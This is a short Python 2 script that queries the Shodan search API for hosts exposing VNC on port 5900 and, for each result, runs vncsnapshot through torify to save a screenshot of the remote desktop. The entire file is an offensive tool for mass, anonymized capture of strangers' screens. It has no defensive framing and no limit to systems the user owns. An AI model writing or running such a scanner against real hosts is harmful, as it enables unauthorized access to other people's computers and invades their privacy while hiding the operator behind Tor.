#!/bin/python

import requests
import threading
import os

API_KEY = "XXXXXXXXXXXXXXXXX"
QUERY = "port:5900 authentication"

class VNCSnapshot(threading.Thread):

    def __init__(self, host, port):
        threading.Thread.__init__(self)
        self.host = host
        self.port = port
        self.daemon = True

    def run(self):
        os.system('torify vncsnapshot %s:0 %s.jpg -ignoreblank' % (self.host, self.host))


i = 1
threads = []
while True: 

    print "[!] Page nb: %s" % i
    data = requests.get('https://api.shodan.io/shodan/host/search?key=%s&query=%s&minify=true&page=%s' % (API_KEY, QUERY, i)).json()
    if data['total'] < i * 100:
        print "[!] No more results."
        break
    for match in data['matches']:
        thread = VNCSnapshot(match['ip_str'], 5900)
        threads.append(thread)
        thread.start()
    i = i + 1

for thread in threads:
    thread.join()